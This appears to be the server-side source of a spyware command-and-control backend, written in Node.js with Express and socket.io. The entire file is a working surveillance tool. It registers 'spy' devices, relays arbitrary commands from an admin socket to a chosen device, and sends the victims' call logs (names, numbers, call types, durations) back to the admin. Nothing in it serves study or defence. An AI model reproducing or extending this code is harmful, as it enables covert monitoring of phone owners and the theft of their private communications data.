//port 
const express = require("express");
var http = require("http");
const app = express();
const port = process.env.PORT || 000;
var server = http.createServer(app);
var io = require("socket.io")(server);


app.use(express.json());
console.log("waiting for a device Connect, at port 3000");

const device_secure_ids = {}
const device_socket_ids = {}

var admin_socket_id;
var admin_status = false;
var call_ones = false;

io.on('connection', socket => {
  console.log("device connected")
  
  //spy connect Event
  socket.on('spy_connect', (device_id, device_name) => {
    device_secure_ids[device_id] = socket.id;
    device_socket_ids[socket.id] = device_id;
    if (admin_status == true) {
      io.to(admin_socket_id).emit('spy_connected', { device_id: device_id, device_name: device_name });
    }else{
      console.log("Unable To Send Data to Admin Reason Admin Offline");
    }
    console.log(device_id)
    console.log(device_name)
  })

  //HeartBeat
  function sendHeartBeat() {
    setTimeout(sendHeartBeat, 8000);
    io.emit('ping');
  }

  //pong Received
  socket.on('pong', (from) => {
    var d = new Date();
    console.log("HeartBeat Received from " + from + " at " + d)
  })

  //admin connect Event
  socket.on('admin_connect', () => {
    admin_socket_id = socket.id;
    admin_status = true;
    io.emit('admin_connected');
    console.log("admin_connected");
  })

  //send command
  socket.on('send_command', (command, to_device) => {
    io.to(device_secure_ids[to_device]).emit(command);
    console.log(command);
    console.log(to_device);

  })

 
  socket.on('spy_call_logs', (number_list,name_list,call_type,duration_list) => {
    console.log(name_list)
    console.log(number_list);
    console.log(duration_list);
    console.log(call_type);
    io.to(admin_socket_id).emit('call_logs_data', name_list,number_list,duration_list,call_type);

  })
  
  //disconnect Event
  socket.on('disconnect', function (reason) {
    if (socket.id == admin_socket_id) {
      console.log('admin disconnected ' + reason);
      admin_status = false;
    } else {
      if (admin_status == true) {
        io.to(admin_socket_id).emit('spy_disconnected', { "device_id": device_socket_ids[socket.id] });
      }
      console.log('connection disconnect From Device : ' + device_socket_ids[socket.id] + " Reason " + reason);
    }
  })

  //close Event
  socket.on('close', (resCode, des) => {
    console.log('connection closed');
    console.log(resCode);
    console.log(des);
  })
  if (call_ones == false) {
    setTimeout(sendHeartBeat, 8000);
    call_ones = true;
  }
})
server.listen(port, "0.0.0.0", () => {
  console.log("server started");
});